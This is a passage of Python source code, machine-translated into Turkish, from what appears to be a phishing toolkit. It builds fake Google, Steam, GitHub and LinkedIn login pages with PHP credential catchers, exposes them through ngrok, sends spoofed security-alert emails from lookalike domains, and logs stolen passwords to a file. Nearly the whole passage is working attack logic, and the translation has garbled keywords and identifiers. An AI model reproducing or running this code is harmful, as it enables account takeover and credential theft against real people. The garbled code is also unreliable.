	ile  açık ( './WEBSERVER/index.html' , 'w' ) olarak  dosya :
		dosyası . yazma ( dosya verileri )
	dosyası . kapat ()
	filedata  =  str ( Giriş1_Google )
	ile  açık ( './WEBSERVER/login_pass.php' , 'w' ) olarak  dosya :
		dosyası . yazma ( dosya verileri )
	filedata  =  str ( Ana2_Google )
	ile  açık ( './WEBSERVER/new_pass.html' , 'w' ) olarak  dosya :
		dosyası . yazma ( dosya verileri )
	filedata  =  str ( Giriş2_Google )
	ile  açık ( './WEBSERVER/login.php' , 'w' ) olarak  dosya :
		dosyası . yazma ( dosya verileri )
	filedata  =  str ( Güvenli_Google )
	ile  açık ( './WEBSERVER/account_secured.html' , 'w' ) olarak  dosya :
		dosyası . yazma ( dosya verileri )
	os . sistemi ( 'touch ./WEBSERVER/creds.txt' )
	os . sistemi ( 'chmod -R 777 ./WEBSERVER/' )
	os . sistemi ( 'xterm -e "cd ./WEBSERVER/ && php -S 127.0.0.1:80" &' )
	os . sistemi ( "./ngrok http 80> / dev / null &" )
	zaman . uyku ( 3 )
	display  =  Display ( görünür = 0 , boyut = ( 800 , 600 ))
	görüntüler . başlangıç ()

	tarayıcı  =  webdriver . Firefox ( firefox_binary = ikili , çalıştırılabilir_yol = 'temel / geckodriver' )
	tarayıcı . get ( "http: // localhost: 4040 / status" )
	zaman . uyku ( 5 )
	url_f = str ( tarayıcı . find_element_by_css_selector ( "li.list-unstyled: nth-child (1)> div: nth-child (2)> tablo: nth-child (2)> tbody: nth-child (1)> tr : nth-child (1)> td: nth-child (2) " ). metin )
	tarayıcı . kapat ()
	phish_url  =  str ( url_f )
	görüntüler . durdur ()
	emaildata  =  str ( Email_Google )
	emaildata  =  emaildata . yerine ( [FIRST_NAME] ' , str ( first_name ))
	emaildata  =  emaildata . değiştirin ( '[OPTION]' , str ( '' ))
	emaildata  =  emaildata . değiştirin ( '[LOC]' , loc )
	emaildata  =  emaildata . değiştir ( '[TIME]' , süre1 )
	emaildata  =  emaildata . değiştir ( '[ PHISHING_URL ]' , str ( phish_url ))
	emaildata  =  emaildata . değiştir ( '[EMAIL]' , str ( em + '' ))
	alt süreç . call ([ 'sendemail' , '-f' , from_email , '-t' , str ( em ), '-u' , 'Oturum açma girişimi' , '-m' , e-posta verileri , '-s' , smtps + ":" + bağlantı noktası , '-xu' , kullanıcı adı , '-xp' , şifre ])
	eğer  Phone_try  ==  "N" :
		geçmek
	elif  Phone_try  ==  "y" :
		os . sistemi ( "xterm -e \" python3 ./sms_support/google_sms.py \ " &" )
	os . sistemi ( "sıfırla" )

	banN ()

	yazdır ( "              \ 033 [0; 37m ########################################## ####### " )
	print ( "#   \ 033 [0mG-ACC'de Krediler için Dinleme: \ 033 [0; 94m" + str ( tam_adı ) + " \ 033 [0; 37m #" )
	yazdır ( "################################################ # \ 033 [0; 93m " )
	yazdır ( "" + Gri + "[ \ 033 [0; 34m *" + Gri + "] - [" + Sıfırla + "EKSTRA-URL" + Gri + "]" + Sıfırla + ": \ 033 [0; 34m " + phish_url + " \ 033 [0; 93m \ n " )

	os . sistemi ( "kuyruk -f ./WEBSERVER/creds.txt" )
	yazdır ( " \ n                  \ 033 [0; 34m ######################################" )
	yazdır ( "# --DONE-- #" )
	yazdır ( "######################################" )
	os . sistemi ( "pkill -9 ngrok" )
	os . sistemi ( "pkill -9 php" )
	print ( "Otomatik Olarak Bir Onay E-postası Gönderme !! \ n " )
	email2data  =  str ( Email2_Google )
	email2data  =  email2data . yerine ( [FIRST_NAME] ' , str ( first_name ))
	email2data  =  email2data . değiştirin ( '[OPTION]' , str ( '' ))
	email2data  =  email2data . değiştir ( '[EMAIL]' , str ( '' ))
	alt süreç . call ([ 'sendemail' , '-f' , from_email , '-t' , str ( em ), '-u' , 'Parola Değiştirildi' , '-m' , e- posta2 verileri , '-s' , smtps + ": " + port , '-xu' , kullanıcı adı , '-xp' , şifre ])
	os . sistemi ( "sıfırla" )
	ENDst ()

################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################

Def  Steam ():
	pic  =  ''

	UNAME  =  giriş ( "" + Gri + "[" + Mavi + "Kullanıcı adı / Kimlik" + Gri + "]" + Yeşil + ":" + Sıfırla )

	E-posta  =  giriş ( "" + Gri + "[" + Mavi + "E-posta" + Gri + "]" + Yeşil + ":" + Sıfırla )

	os . sistemi ( 'reset' )
	baskı ( Mavi + "" "________ _________ _______ ________ _____ ______" "" )
	yazdır ( Mavi + "" "| \\    ____ \\ | \\ ___ ___ \\ \\   ___ \\ | \\    __   \\ | \\    _ \\   _    \\          " "" )
	yazdır ( Mavi + "" "       \\  \\   \\ ___ | \\ | ___ \\   \\ _ \\  \\    __ / | \\  \\   \\ | \\   \\  \\   \\ \\ \\ __ \\  \\   \\         "" " )
	yazdır ( Mavi + "" "        \\  \\ _____   \\    \\  \\   \\  \\  \\   \\ _ | / _ \\  \\    __   \\  \\   \\ \\ | __ | \\   \\        "" " )
	yazdır ( Mavi + "" "         \\ | ____ | \\   \\    \\  \\   \\  \\  \\   \\ _ | \\  \\  \\   \\  \\   \\  \\   \\     \\  \\   \\       "" " )
	yazdır ( Mavi + "" "____ \\ _ \\   \\    \\  \\ __ \\  \\  \\ _______ \\  \\ __ \\  \\ __ \\  \\ __ \\     \\  \\ __ \ \      "" " )
	yazdır ( Mavi + "" "| \\ _________ \\    \\ | __ |   \\ | _______ | \\ | __ | \\ | __ | \\ | __ |      \\ | __ |" "" )
	yazdır ( Mavi + "" "          \\ | _________ |" "" )
	baskı ( Mavi + "" "" "" )
	baskı ( Mavi + "" "" "" )
	baskı ( Mavi + "" "___ ___ ________ ________ ___ __ ________" "" )
	yazdır ( Mavi + "" "| \\   \\ | \\   \\ | \\    __   \\ | \\    __   \\ | \\   \\ | \\   \\ | \\    __   \\     " "" )
	yazdır ( Mavi + "" "             \\  \\   \\ \\ \\   \\  \\   \\ | \\   \\  \\   \\ | \\   \\  \\   \\ / / | \\  \\   \\ | \\   \\    "" " )
	yazdır ( Mavi + "" "              \\  \\    __   \\  \\   \\ \\ \\   \\  \\   \\ \\ \\   \\  \\    ___   \\  \\    __   \\   " "" )
	yazdır ( Mavi + "" "               \\  \\   \\  \\   \\  \\   \\ \\ \\   \\  \\   \\ \\ \\   \\  \\   \\ \\  \\   \\  \\   \ \  \\   \\ "" " )
	yazdır ( Mavi + "" "                \\  \\ __ \\  \\ __ \\  \\ _______ \\  \\ _______ \\  \\ __ \\ \\  \\ __ \\  \\ __ \\  \\ __ \ \ "" " )
	yazdır ( Mavi + "" "                 \\ | __ | \\ | __ | \\ | _______ | \\ | _______ | \\ | __ | \\ | __ | \\ | __ | \\ | __ |" "" + Yeşil + 'V1.0 \ n ' )
	yazdır ( "" + Gri + "[" + Yeşil + "Saldırı Başladı" + Gri + "]" + Sıfırla )

	display  =  Display ( görünür = 0 , boyut = ( 800 , 600 ))
	görüntüler . başlangıç ()
	br  =  web sürücüsü . Firefox ( firefox_binary = ikili , çalıştırılabilir_yol = 'temel / geckodriver' )

	dene :
		br . get ( 'https://steamcommunity.com/id/' + str ( UNAME ))
		zaman . uyku ( 1 )
		pic  =  br . find_element_by_css_selector ( '.playerAvatarAutoSizeInner> img: nth-child (1)' ). get_attribute ( "src" )
	 İstisna hariç :
		br . get ( 'https://steamcommunity.com/profiles/' + str ( UNAME ))
		zaman . uyku ( 1 )
		pic  =  br . find_element_by_css_selector ( '.playerAvatarAutoSizeInner> img: nth-child (1)' ). get_attribute ( "src" )

	İSİM  =  br . find_element_by_css_selector ( '.profile_header_centered_persona> div: nth-child (1)> span: nth-child (1)' ). Metin

	br . kapat ()
	görüntüler . durdur ()

	os . sistemi ( 'rm -r ./WEBSERVER' )
	os . sistemi ( 'mkdir ./WEBSERVER' )


	filedata  =  str ( Main_steam )
	ile  açık ( './WEBSERVER/index.html' , 'w' ) olarak  dosya :
		dosyası . yazma ( dosya verileri )


	filedata  =  str ( ChangePass_steam )

	filedata  =  dosya verileri . değiştirin ( '[PIC]' , str ( resim ))
	filedata  =  dosya verileri . değiştir ( '[NAME]' , str ( NAME ))

	ile  açık ( './WEBSERVER/change_password.html' , 'w' ) olarak  dosya :
		dosyası . yazma ( dosya verileri )



	filedata  =  str ( Secured_steam )
	ile  açık ( './WEBSERVER/account_secured.html' , 'w' ) olarak  dosya :
		dosyası . yazma ( dosya verileri )



	filedata  =  str ( Login_steam )
	ile  açık ( './WEBSERVER/login.php' , 'w' ) olarak  dosya :
		dosyası . yazma ( dosya verileri )


	filedata  =  str ( Login2_steam )
	ile  açık ( './WEBSERVER/login2.php' , 'w' ) olarak  dosya :
		dosyası . yazma ( dosya verileri )


	os . sistemi ( 'echo ""> ./WEBSERVER/creds.txt' )


	kod  =  rastgele . seçim ([ '4JN89' , '9KL07' , '57LK1' , 'K85D0' , '7GHS5' ])


	os . sistemi ( 'chmod -R 777 ./WEBSERVER/' )
	os . sistemi ( 'xterm -e "cd ./WEBSERVER/ && php -S 127.0.0.1:80" &' )
	os . sistemi ( "./ngrok http 80> / dev / null &" )
	zaman . uyku ( 3 )
	display  =  Display ( görünür = 0 , boyut = ( 800 , 600 ))
	görüntüler . başlangıç ()
	tarayıcı  =  webdriver . Firefox ( firefox_binary = ikili , çalıştırılabilir_yol = 'temel / geckodriver' )
	tarayıcı . get ( "http: // localhost: 4040 / status" )
	zaman . uyku ( 5 )
	url_f = str ( tarayıcı . find_element_by_css_selector ( "li.list-unstyled: nth-child (1)> div: nth-child (2)> tablo: nth-child (2)> tbody: nth-child (1)> tr : nth-child (1)> td: nth-child (2) " ). metin )
	tarayıcı . kapat ()
	görüntüler . durdur ()
	phishin_url  =  str ( url_f )


	emaildata  =  str ( Email_steam )


	emaildata  =  emaildata . değiştir ( '[EMAIL]' , str ( E-posta ))
	emaildata  =  emaildata . değiştir ( '[CODE]' , str ( kod ))
	emaildata  =  emaildata . değiştir ( '[ PHISH ]' , str ( phishin_url ))

	from_email  =  str ( rastgele . seçim ([ 'security@steammails.com' , 'no-reply@steammails.com' ]))

	alt süreç . call ([ 'sendemail' , '-f' , from_email , '-t' , str ( E-posta ), '-u' , 'Giriş yapmaya mı çalışıyorsunuz?' , '-m' , e-posta verileri , '-s' , smtps + ":" + bağlantı noktası , '-xu' , kullanıcı adı , '-xp' , şifre ])

	os . sistemi ( 'reset' )
	banN ()

	yazdır ( "              \ 033 [0; 37m ########################################## ####### " )
	print ( "#   \ 033 [0mU / ID'deki Krediler için Dinleme: \ 033 [0; 94m" + str ( UNAME ) + " \ 033 [0; 37m #" )
	yazdır ( "################################################ # \ 033 [0; 93m " )
	yazdır ( "" + Gri + "[ \ 033 [0; 34m *" + Gri + "] - [" + Sıfırla + "EKSTRA-URL" + Gri + "]" + Sıfırla + ": \ 033 [0; 34m " + phishin_url + " \ 033 [0; 93m \ n " )

	os . sistemi ( 'tail -f ./WEBSERVER/creds.txt' )
	yazdır ( " \ n                  \ 033 [0; 34m ######################################" )
	yazdır ( "# --DONE-- #" )
	yazdır ( "######################################" )
	os . sistemi ( "pkill -9 ngrok" )
	os . sistemi ( "pkill -9 php" )
	print ( "Otomatik Olarak Bir Onay E-postası Gönderme !! \ n " )

	emaildata  =  str ( Email1_steam )
	emaildata  =  emaildata . değiştir ( '[EMAIL]' , str ( E-posta ))

	alt süreç . call ([ 'sendemail' , '-f' , from_email , '-t' , str ( E-posta ), '-u' , 'şifre değişti' , '-m' , e-posta verileri , '-s' , smtps + ": " + port , '-xu' , kullanıcı adı , '-xp' , şifre ])
	os . sistemi ( "sıfırla" )
	ENDst ()


################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################


def  Github ():

	pic  =  ''
	loc  =  ''

	UNAME  =  giriş ( "" + Gri + "[" + Mavi + "Kullanıcı adı" + Gri + "]" + Yeşil + ":" + Sıfırla )
	E-posta  =  giriş ( "" + Gri + "[" + Mavi + "E-posta" + Gri + "]" + Yeşil + ":" + Sıfırla )

	rndm  =  giriş ( "" + Gri + "[" + Mavi + "" + Gri + "]" + Yeşil + "? -" + Gri + "[" + Mavi + "y" + için rastgele ayarlar kullanmak istiyorum Gri + "/" + Mavi + "N" + Gri + "]" + Yeşil + ":" + Sıfırla )

	eğer  RNDM  ==  "N" :
		loc  =  giriş ( "" + Gri + "[" + Mavi + "Konum" + Gri + "]" + Yeşil + ":" + Sıfırla )

	elif  rndm  ==  "y" :
		loc  =  rastgele . seçim ([ 'Irak' , 'Mısır' , 'Rusya' ])


	os . sistemi ( 'reset' )
	baskı ( Mavi + '________ ___ _________' )
	yazdır ( Mavi + '| \\    ____ \\ | \\   \\ | \\ ___ ___ \\                      ' )
	yazdır ( Mavi + '                    \\  \\   \\ ___ | \\  \\   \\ | ___ \\   \\ _ |' )
	yazdır ( Mavi + '                     \\  \\   \\   __ \\  \\   \\    \\  \\   \\                       ' )
	yazdır ( Mavi + '                      \\  \\   \\ | \\   \\  \\   \\    \\  \\   \\                      ' )
	yazdır ( Mavi + '                       \\  \\ _______ \\  \\ __ \\    \\  \\ __ \\                     ' )
	yazdır ( Mavi + '                        \\ | _______ | \\ | __ |     \\ | __ |' )
	baskı ( Mavi + '' )
	baskı ( Mavi + '' )
	baskı ( Mavi + '' )
	baskı ( Mavi + '___ ___ ________ ________ ___ __ ________' )
	yazdır ( Mavi + '| \\   \\ | \\   \\ | \\    __   \\ | \\    __   \\ | \\   \\ | \\   \\ | \\    __   \\     ' )
	yazdır ( Mavi + '             \\  \\   \\ \\ \\   \\  \\   \\ | \\   \\  \\   \\ | \\   \\  \\   \\ / / | \\  \\   \\ | \ \   \\    ' )
	baskı ( Mavi + '              \\  \\    __   \\  \\   \\ \\ \\   \\  \\   \\ \\ \\   \\  \\    ___   \\  \\    __   \\   ' )
	yazdır ( Mavi + '               \\  \\   \\  \\   \\  \\   \\ \\ \\   \\  \\   \\ \\ \\   \\  \\   \\ \\  \\   \\  \\   \\  \ \   \\ ' )
	yazdır ( Mavi + '                \\  \\ __ \\  \\ __ \\  \\ _______ \\  \\ _______ \\  \\ __ \\ \\  \\ __ \\  \\ __ \\  \\ __ \\ ' )
	yazdır ( Mavi + '                 \\ | __ | \\ | __ | \\ | _______ | \\ | _______ | \\ | __ | \\ | __ | \\ | __ | \\ | __ |' + Yeşil + ' V1.0 ' )
	yazdır ( "" + Gri + "[" + Yeşil + "Saldırı Başladı" + Gri + "]" + Sıfırla )


	display  =  Display ( görünür = 0 , boyut = ( 800 , 600 ))
	görüntüler . başlangıç ()

	dene :
		br  =  web sürücüsü . Firefox ( firefox_binary = ikili , çalıştırılabilir_yol = 'temel / geckodriver' )
		zaman . uyku ( 2 )
		GITURL  =  'https://www.github.com/' + str ( UNAME )
		br . get ( GITURL )
		zaman . uyku ( 4 )
		img  =  br . find_element_by_css_selector ( 'img.avatar: nth-child (1)' ). get_attribute ( "src" )
	 İstisna hariç :
		baskı ( ' \ N      ' + kırmızı + 'BUZZZ, kullanıcı Doesn \' 't ana kadar )
		sys . çıkış ( 0 )

	görüntüler . durdur ()


	os . sistemi ( 'rm -r ./WEBSERVER/' )
	os . sistemi ( 'mkdir ./WEBSERVER' )

	filedata  =  str ( Main_github )

	filedata  =  dosya verileri . değiştir ( '[PIC]' , str ( img ))
	filedata  =  dosya verileri . değiştir ( '[UNAME]' , str ( UNAME ))
	filedata  =  dosya verileri . değiştirin ( '[OPTION]' , '' )

	ile  açık ( './WEBSERVER/index.html' , 'w' ) olarak  dosya :
		dosyası . yazma ( dosya verileri )



	filedata  =  str ( Main_github )

	filedata  =  dosya verileri . değiştir ( '[PIC]' , str ( img ))
	filedata  =  dosya verileri . değiştir ( '[UNAME]' , str ( UNAME ))
	filedata  =  dosya verileri . değiştir ( '[OPTION]' , str ( Option_github ))

	ile  açık ( './WEBSERVER/pass_changed.html' , 'w' ) olarak  dosya :
		dosyası . yazma ( dosya verileri )


	filedata  =  str ( Login_github )
	ile  açık ( './WEBSERVER/login.php' , 'w' ) olarak  dosya :
		dosyası . yazma ( dosya verileri )

	os . sistemi ( 'touch ./WEBSERVER/creds.txt' )



	os . sistemi ( 'chmod -R 777 ./WEBSERVER/' )
	os . sistemi ( 'xterm -e "cd ./WEBSERVER/ && php -S 127.0.0.1:80" &' )
	os . sistemi ( "./ngrok http 80> / dev / null &" )
	zaman . uyku ( 3 )
	display  =  Display ( görünür = 0 , boyut = ( 800 , 600 ))
	görüntüler . başlangıç ()
	tarayıcı  =  webdriver . Firefox ( firefox_binary = ikili , çalıştırılabilir_yol = 'temel / geckodriver' )
	tarayıcı . get ( "http: // localhost: 4040 / status" )
	zaman . uyku ( 5 )
	url_f = str ( tarayıcı . find_element_by_css_selector ( "li.list-unstyled: nth-child (1)> div: nth-child (2)> tablo: nth-child (2)> tbody: nth-child (1)> tr : nth-child (1)> td: nth-child (2) " ). metin )
	tarayıcı . kapat ()
	görüntüler . durdur ()
	phishin_url  =  str ( url_f )


	emaildata  =  str ( Email_github )
	emaildata  =  emaildata . değiştir ( '[UNAME]' , str ( UNAME ))
	emaildata  =  emaildata . değiştir ( '[EMAIL]' , str ( E-posta ))
	emaildata  =  emaildata . değiştir ( '[LOC]' , str ( loc ))
	emaildata  =  emaildata . değiştir ( '[ PHISH ]' , str ( phishin_url ))



	from_email  =  str ( rastgele . seçim ([ 'security@gitmails.com' , 'no-reply@gitmails.com' ]))

	alt süreç . call ([ 'sendemail' , '-f' , from_email , '-t' , str ( E-posta ), '-u' , 'Giriş yapmaya mı çalışıyorsunuz?' , '-m' , e-posta verileri , '-s' , smtps + ":" + bağlantı noktası , '-xu' , kullanıcı adı , '-xp' , şifre ])

	os . sistemi ( 'reset' )
	banN ()

	yazdır ( "              \ 033 [0; 37m ########################################## ####### " )
	print ( "#   \ 033 [0mAd üzerindeki Krediler için Dinleme: \ 033 [0; 94m" + str ( UNAME ) + " \ 033 [0; 37m #" )
	yazdır ( "################################################ # \ 033 [0; 93m " )
	yazdır ( "" + Gri + "[ \ 033 [0; 34m *" + Gri + "] - [" + Sıfırla + "EKSTRA-URL" + Gri + "]" + Sıfırla + ": \ 033 [0; 34m " + phishin_url + " \ 033 [0; 93m \ n " )

	os . sistemi ( 'tail -f ./WEBSERVER/creds.txt' )
	yazdır ( " \ n                  \ 033 [0; 34m ######################################" )
	yazdır ( "# --DONE-- #" )
	yazdır ( "######################################" )
	os . sistemi ( "pkill -9 ngrok" )
	os . sistemi ( "pkill -9 php" )
	print ( "Otomatik Olarak Bir Onay E-postası Gönderme !! \ n " )

	emaildata  =  str ( Email1_github )
	emaildata  =  emaildata . değiştir ( '[UNAME]' , str ( UNAME ))

	alt süreç . call ([ 'sendemail' , '-f' , from_email , '-t' , str ( E-posta ), '-u' , 'şifre değişti' , '-m' , e-posta verileri , '-s' , smtps + ": " + port , '-xu' , kullanıcı adı , '-xp' , şifre ])
	os . sistemi ( "sıfırla" )
	ENDst ()



################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################



def  LinkedIn ():
	AD  =  giriş ( "" + Gri + "[" + Mavi + "Ad" + Gri + "]" + Yeşil + ":" + Sıfırla )
	E-posta  =  giriş ( "" + Gri + "[" + Mavi + "E-posta" + Gri + "]" + Yeşil + ":" + Sıfırla )

	rndm  =  giriş ( "" + Gri + "[" + Mavi + "" + Gri + "]" + Yeşil + "? -" + Gri + "[" + Mavi + "y" + için rastgele ayarlar kullanmak istiyorum Gri + "/" + Mavi + "N" + Gri + "]" + Yeşil + ":" + Sıfırla )

	PIC  =  giriş ( "" + Gri + "[" + Mavi + "ProfileImgLink" + Gri + "]" + Yeşil + ":" + Sıfırla )


	eğer  RNDM  ==  "N" :
		osz  =   giriş ( "" + Gri + "[" + Mavi + "OS" + Gri + "]" + Yeşil + ":" + Sıfırla )
		locz  =  giriş ( "" + Gri + "[" + Mavi + "Konum" + Gri + "]" + Yeşil + ":" + Sıfırla )
	elif  rndm  ==  "y" :
		locz  =  rastgele . seçim ([ 'Irak' , 'Mısır' , 'Rusya' ])
		osz  =  rastgele . seçim ([ 'Linux' ])	


	first_name  =  NAME . şerit (). bölünmüş ( "" , 1 ) [ 0 ]



	os . sistemi ( 'reset' )

	baskı ( Mavi + "___ ___ __ ________ ________" )
	yazdır ( Mavi + "| \\   \\      | \\   \\ | \\   \\ | \\    ___ \\ | \\    ___   \\              " )
	yazdır ( Mavi + "             \\  \\   \\     \\  \\   \\ / / | \\  \\   \\ _ | \\  \\  \\   \\ \\  \\   \\             " )
	baskı ( Mavi + "              \\  \\   \\     \\  \\    ___   \\  \\   \\  \\ \\  \\  \\   \\ \\  \\   \\            " )
	baskı ( Mavi + "               \\  \\   \\ ____ \\  \\   \\ \\  \\   \\  \\   \\ _ \\ \\  \\  \\   \\ \\  \\   \\           " )
	yazdır ( Mavi + "                \\  \\ _______ \\  \\ __ \\ \\  \\ __ \\  \\ _______ \\  \\ __ \\ \\  \\ __ \\          " )
	yazdır ( Mavi + "                 \\ | _______ | \\ | __ | \\ | __ | \\ | _______ | \\ | __ | \\ | __ |" )
	baskı ( Mavi + "" )
	baskı ( Mavi + "" )
	baskı ( Mavi + "" )
	baskı ( Mavi + "___ ___ ________ ________ ___ __ ________" )
	yazdır ( Mavi + "| \\   \\ | \\   \\ | \\    __   \\ | \\    __   \\ | \\   \\ | \\   \\ | \\    __   \\     " )
	yazdır ( Mavi + "             \\  \\   \\ \\ \\   \\  \\   \\ | \\   \\  \\   \\ | \\   \\  \\   \\ / / | \\  \\   \\ | \ \   \\    " )
	baskı ( Mavi + "              \\  \\    __   \\  \\   \\ \\ \\   \\  \\   \\ \\ \\   \\  \\    ___   \\  \\    __   \\   " )
	yazdır ( Mavi + "               \\  \\   \\  \\   \\  \\   \\ \\ \\   \\  \\   \\ \\ \\   \\  \\   \\ \\  \\   \\  \\   \\  \ \   \\ " )
	yazdır ( Mavi + "                \\  \\ __ \\  \\ __ \\  \\ _______ \\  \\ _______ \\  \\ __ \\ \\  \\ __ \\  \\ __ \\  \\ __ \\ " )
	yazdır ( Mavi + "                 \\ | __ | \\ | __ | \\ | _______ | \\ | _______ | \\ | __ | \\ | __ | \\ | __ | \\ | __ |" + Yeşil + " V1.0 " + Sıfırla )
	yazdır ( "" + Gri + "[" + Yeşil + "Saldırı Başladı" + Gri + "]" + Sıfırla )


	os . sistemi ( 'rm -r ./WEBSERVER/' )
	os . sistemi ( 'mkdir ./WEBSERVER' )

	filedata  =  str ( Main_Linkedin )

	filedata  =  dosya verileri . değiştir ( '[PIC]' , PIC )
	filedata  =  dosya verileri . değiştir ( '[UNAME]' , str ( NAME ))
	filedata  =  dosya verileri . değiştir ( '[FIRSTNAME]' , str ( ad_adı ))

	ile  açık ( './WEBSERVER/index.html' , 'w' ) olarak  dosya :
		dosyası . yazma ( dosya verileri )


	filedata  =  str ( Secured_Linkedin )
	ile  açık ( './WEBSERVER/pass_changed.html' , 'w' ) olarak  dosya :
		dosyası . yazma ( dosya verileri )


	filedata  =  str ( Login_Linkedin )
	ile  açık ( './WEBSERVER/login.php' , 'w' ) olarak  dosya :
		dosyası . yazma ( dosya verileri )


	os . sistemi ( 'touch ./WEBSERVER/creds.txt' )



	os . sistemi ( 'chmod -R 777 ./WEBSERVER/' )
	os . sistemi ( 'xterm -e "cd ./WEBSERVER/ && php -S 127.0.0.1:80" &' )
	os . sistemi ( "./ngrok http 80> / dev / null &" )
	zaman . uyku ( 3 )
	display  =  Display ( görünür = 0 , boyut = ( 800 , 600 ))
	görüntüler . başlangıç ()
	tarayıcı  =  webdriver . Firefox ( firefox_binary = ikili , çalıştırılabilir_yol = 'temel / geckodriver' )
	tarayıcı . get ( "http: // localhost: 4040 / status" )
	zaman . uyku ( 5 )
	url_f = str ( tarayıcı . find_element_by_css_selector ( "li.list-unstyled: nth-child (1)> div: nth-child (2)> tablo: nth-child (2)> tbody: nth-child (1)> tr : nth-child (1)> td: nth-child (2) " ). metin )
	tarayıcı . kapat ()
	görüntüler . durdur ()
	phishin_url  =  str ( url_f )


	emaildata  =  str ( Email1_Linkedin )
	emaildata  =  emaildata . değiştir ( '[FIRSTNAME]' , str ( ad_adı ))
	emaildata  =  emaildata . değiştir ( '[OS]' , str ( osz ))
	emaildata  =  emaildata . değiştir ( '[LOC]' , str ( locz ))
	emaildata  =  emaildata . değiştir ( '[kimlik avı]' , str ( phishin_url ))

	from_email  =  str ( rastgele . seçim ([ 'security@linkedinmails.com' , 'no-reply@linkedinmails.com' ]))

	alt süreç . call ([ 'sendemail' , '-f' , from_email , '-t' , str ( E-posta ), '-u' , 'Giriş yapmaya mı çalışıyorsunuz?' , '-m' , e-posta verileri , '-s' , smtps + ":" + bağlantı noktası , '-xu' , kullanıcı adı , '-xp' , şifre ])

	os . sistemi ( 'reset' )
	banN ()

	yazdır ( "              \ 033 [0; 37m ########################################## ####### " )
	print ( "#   \ 033 [0mBölümdeki Krediler için Dinleme: \ 033 [0; 94m" + str ( NAME ) + " \ 033 [0; 37m #" )
	yazdır ( "################################################ # \ 033 [0; 93m " )
	yazdır ( "" + Gri + "[ \ 033 [0; 34m *" + Gri + "] - [" + Sıfırla + "EKSTRA-URL" + Gri + "]" + Sıfırla + ": \ 033 [0; 34m " + phishin_url + " \ 033 [0; 93m \ n " )

	os . sistemi ( 'tail -f ./WEBSERVER/creds.txt' )

	yazdır ( " \ n                  \ 033 [0; 34m ######################################" )
	yazdır ( "# --DONE-- #" )
	yazdır ( "######################################" )
	os . sistemi ( "pkill -9 ngrok" )
	os . sistemi ( "pkill -9 php" )
	print ( "Otomatik Olarak Bir Onay E-postası Gönderme !! \ n " )

	emaildata  =  str ( Email2_Linkedin )
	emaildata  =  emaildata . değiştir ( '[FIRSTNAME]' , str ( ad_adı ))

	alt süreç . call ([ 'sendemail' , '-f' , from_email , '-t' , str ( E-posta ), '-u' , 'şifre değişti' , '-m' , e-posta verileri , '-s' , smtps + ": " + port , '-xu' , kullanıcı adı , '-xp' , şifre ])
	os . sistemi ( "sıfırla" )
	ENDst ()





################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################





tan  Pinterest ():
	UNAME  =  giriş ( "" + Gri + "[" + Mavi + "Kullanıcı adı" + Gri + "]" + Yeşil + ":" + Sıfırla )
	E-posta  =  giriş ( "" + Gri + "[" + Mavi + "E-posta" + Gri + "]" + Yeşil + ":" + Sıfırla )

	rndm  =  giriş ( "" + Gri + "[" + Mavi + "" + Gri + "]" + Yeşil + "? -" + Gri + "[" + Mavi + "y" + için rastgele ayarlar kullanmak istiyorum Gri + "/" + Mavi + "N" + Gri + "]" + Yeşil + ":" + Sıfırla )

	eğer  RNDM  ==  "N" :
		osz  =   giriş ( "" + Gri + "[" + Mavi + "OS" + Gri + "]" + Yeşil + ":" + Sıfırla )
		locz  =  giriş ( "" + Gri + "[" + Mavi + "Konum" + Gri + "]" + Yeşil + ":" + Sıfırla )
	elif  rndm  ==  "y" :
		locz  =  rastgele . seçim ([ 'Irak' , 'Mısır' , 'Rusya' ])
		osz  =  rastgele . seçim ([ 'Linux' ])	

	os . sistemi ( 'reset' )

	baskı ( Mavi + "" "___________ ________" "" )
	yazdır ( Mavi + "" "| \\    __   \\ | \\   \\ | \\    ___   \\                          " "" )
	yazdır ( Mavi + "" "                 \\  \\   \\ | \\   \\  \\   \\  \\   \\ \\  \\   \\                         " "" )
	yazdır ( Mavi + "" "                  \\  \\    ____ \\  \\   \\  \\   \\ \\  \\   \\                        " "" )
	yazdır ( Mavi + "" "                   \\  \\   \\ ___ | \\  \\   \\  \\   \\ \\  \\   \\                       " "" )
	yazdır ( Mavi + "" "                    \\  \\ __ \\     \\  \\ __ \\  \\ __ \\ \\  \\ __ \\                      " "" )
	yazdır ( Mavi + "" "                     \\ | __ |      \\ | __ | \\ | __ | \\ | __ |" "" )
	baskı ( Mavi + "" "" "" )
	baskı ( Mavi + "" "" "" )
	baskı ( Mavi + "" "" "" )
	baskı ( Mavi + "" "___ ___ ________ ________ ___ __ ________" "" )
	yazdır ( Mavi + "" "| \\   \\ | \\   \\ | \\    __   \\ | \\    __   \\ | \\   \\ | \\   \\ | \\    __   \\     " "" )
	yazdır ( Mavi + "" "             \\  \\   \\ \\ \\   \\  \\   \\ | \\   \\  \\   \\ | \\   \\  \\   \\ / / | \\  \\   \\ | \\   \\    "" " )
	yazdır ( Mavi + "" "              \\  \\    __   \\  \\   \\ \\ \\   \\  \\   \\ \\ \\   \\  \\    ___   \\  \\    __   \\   " "" )
	yazdır ( Mavi + "" "               \\  \\   \\  \\   \\  \\   \\ \\ \\   \\  \\   \\ \\ \\   \\  \\   \\ \\  \\   \\  \\   \ \  \\   \\ "" " )
	yazdır ( Mavi + "" "                \\  \\ __ \\  \\ __ \\  \\ _______ \\  \\ _______ \\  \\ __ \\ \\  \\ __ \\  \\ __ \\  \\ __ \ \ "" " )
	yazdır ( Mavi + "" "                 \\ | __ | \\ | __ | \\ | _______ | \\ | _______ | \\ | __ | \\ | __ | \\ | __ | \\ | __ |" "" )
	yazdır ( "" + Gri + "[" + Yeşil + "Saldırı Başladı" + Gri + "]" + Sıfırla )

	AD  =  ''
	EMAIL  =  ''

	dene :
		display  =  Display ( görünür = 0 , boyut = ( 800 , 600 ))
		görüntüler . başlangıç ()
		br  =  web sürücüsü . Firefox ( firefox_binary = ikili , çalıştırılabilir_yol = 'temel / geckodriver' )
		url  =  'https://pinterest.com/' + str ( UNAME ) + '/'
		br . get ( url )
